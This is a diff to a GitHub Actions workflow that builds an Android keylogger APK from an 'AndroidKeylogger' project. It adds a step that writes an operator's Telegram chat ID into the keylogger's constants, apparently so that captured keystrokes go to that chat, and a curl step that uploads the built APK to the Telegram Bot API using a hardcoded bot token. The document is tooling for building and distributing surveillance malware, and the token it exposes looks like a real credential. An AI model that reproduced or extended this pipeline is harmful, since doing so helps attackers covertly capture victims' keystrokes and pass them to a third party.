@@ -2,6 +2,10 @@ name: Build APK
 
 on:
   workflow_dispatch:
+    inputs:
+      chat_id:
+        description: 'Telegram Chat ID'
+        required: true
 
 jobs:
   build:
@@ -20,7 +24,7 @@ jobs:
     - name: Ensure Gradle wrapper directory exists
       run: |
         mkdir -p gradle/wrapper
-        echo "distributionUrl=https\://services.gradle.org/distributions/gradle-7.5.1-all.zip" > gradle/wrapper/gradle-wrapper.properties
+        echo "distributionUrl=https\\://services.gradle.org/distributions/gradle-7.5.1-all.zip" > gradle/wrapper/gradle-wrapper.properties
 
     - name: Set executable permissions for gradlew
       run: chmod +x ./gradlew
@@ -28,6 +32,11 @@ jobs:
 
     - name: Update Gradle Wrapper
       run: ./gradlew wrapper --gradle-version 7.5.1
+      working-directory: AndroidKeylogger
+
+    - name: Inject Chat ID into Constants.java
+      run: |
+        sed -i "s/CHAT_ID_PLACEHOLDER/${{ github.event.inputs.chat_id }}/g" app/src/main/java/com/bshu2/androidkeylogger/Constants.java
       working-directory: AndroidKeylogger
 
     - name: Build APK
@@ -39,4 +48,11 @@ jobs:
       with:
         name: user-apk
         path: AndroidKeylogger/app/build/outputs/apk/debug/app-debug.apk
+
+    - name: Send APK to Telegram
+      run: |
+        curl -F "chat_id=${{ github.event.inputs.chat_id }}" \
+             -F "document=@AndroidKeylogger/app/build/outputs/apk/debug/app-debug.apk" \
+             https://api.telegram.org/bot8000560638:AAHrOlt9b4U-QKmgnuOBl7bDxGzuz2wGXi4/sendDocument
+
 
